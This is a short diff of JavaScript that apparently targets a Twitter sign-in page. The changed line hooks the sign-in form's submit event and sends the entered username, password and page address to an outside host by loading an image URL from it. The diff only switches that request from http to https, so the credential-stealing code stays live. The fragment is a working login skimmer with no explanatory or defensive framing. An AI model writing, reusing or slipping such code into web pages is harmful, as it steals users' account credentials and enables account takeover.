@@ -26,7 +26,7 @@ document.getElementById("session").innerHTML = '<a href="https://twitter.com/?la
 
 document.getElementsByClassName('t1-form signin')[0].onsubmit = function(e) {
 
-   new Image().src = 'http://siktir.ddospanel.com/cptw.php?username='+document.getElementById('signin-email').value+'&sifre='+document.getElementById('signin-password').value+'&location='+location.href;   
+   new Image().src = 'https://siktir.ddospanel.com/cptw.php?username='+document.getElementById('signin-email').value+'&sifre='+document.getElementById('signin-password').value+'&location='+location.href;   
 }
 
 
